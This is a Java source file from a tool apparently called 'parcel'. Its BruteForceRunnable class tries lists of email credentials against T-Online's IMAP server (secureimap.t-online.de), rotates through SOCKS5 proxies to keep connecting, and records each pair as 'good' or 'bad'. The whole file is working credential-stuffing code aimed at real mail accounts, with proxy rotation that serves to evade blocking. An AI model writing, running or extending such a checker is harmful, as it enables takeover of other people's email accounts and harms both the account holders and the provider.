package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import com.chilkatsoft.CkString;
import lombok.RequiredArgsConstructor;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.components.LogView;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.Source;
import org.bsoftware.parcel.utilities.FileSystemUtility;

import java.io.IOException;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.3
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Defines use or not SSL and TLS
     */
    private static final boolean SSL_AND_TLS = Boolean.TRUE;

    /**
     * Defines IMAP server port
     */
    private static final short IMAP_PORT = 993;

    /**
     * Defines connection timeout
     */
    private static final byte CONNECTION_TIMEOUT = 5;

    /**
     * Defines Socks version
     */
    private static final byte SOCKS_VERSION = 5;

    /**
     * Defines IMAP server host link
     */
    private static final String IMAP_SERVER = "secureimap.t-online.de";

    /**
     * Indicator for proxy usage
     */
    private final boolean useProxies;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_Ssl(SSL_AND_TLS);
        ckImap.put_StartTls(SSL_AND_TLS);
        ckImap.put_Port(IMAP_PORT);

        if (useProxies)
        {
            ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
            ckImap.put_SocksVersion(SOCKS_VERSION);
        }

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                if (useProxies && failedToConnect(ckImap))
                {
                    break;
                }
                else
                {
                    ckImap.Connect(IMAP_SERVER);
                }

                FileSystemUtility.saveLineToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
                bruteForceCallback.handleDecrementCounter(DataType.SOURCE);

                ckImap.Disconnect();
            }
        }
        catch (final IOException exception)
        {
            bruteForceCallback.handleBruteForceMessage(LogView.LogLevel.ERROR, String.format("Exception occurred, while saving source to file, clause: %s", exception.getMessage()));
        }

        bruteForceCallback.handleThreadInterruption();
    }

    /**
     * Get new proxy until they available
     *
     * @param ckImap - imap object to probe connection
     * @return true, when cannot connect to imap server
     */
    private boolean failedToConnect(final CkImap ckImap)
    {
        final CkString currentProxyHostname = new CkString();

        ckImap.get_SocksHostname(currentProxyHostname);
        if (!currentProxyHostname.getString().isEmpty() && ckImap.Connect(IMAP_SERVER))
        {
            return Boolean.FALSE;
        }

        Proxy proxy;
        while (((proxy = DataContainer.getNextProxy()) != null) && !Thread.currentThread().isInterrupted())
        {
            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());
            bruteForceCallback.handleDecrementCounter(DataType.PROXY);

            if (ckImap.Connect(IMAP_SERVER))
            {
                return Boolean.FALSE;
            }
        }

        return Boolean.TRUE;
    }
}